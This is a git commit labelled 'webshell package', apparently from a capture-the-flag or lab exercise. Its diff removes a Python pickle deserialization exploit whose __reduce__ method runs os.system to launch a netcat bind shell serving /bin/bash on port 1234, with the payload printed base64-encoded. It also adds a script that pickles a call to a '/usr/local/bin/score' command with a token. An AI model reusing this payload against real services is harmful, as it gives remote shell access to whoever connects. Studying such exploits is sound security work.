a0d7718268c8593b24326f1b47c9812a76afe954
Martijn X1M <martijn@x1m.nl>
2017-09-06 00:39:18 +0200

    webshell package

--- pickle.py
+++
@@ -1,7 +0,0 @@
-import cPickle, os, base64
-
-class Blah(object):
-    def __reduce__(self):
-        return (os.system("netcat -c '/bin/bash -i' -l -p 1234 "))
-
-print base64.b64encode(cPickle.dumps(Blah()))
---
+++ picklescript2.py
@@ -0,0 +1,3 @@
+import pickle
+data = ("/usr/local/bin/score 03031824-841d-47c6-9cec-5144b3087f28")
+pickle.dumps(data).encode('base64')
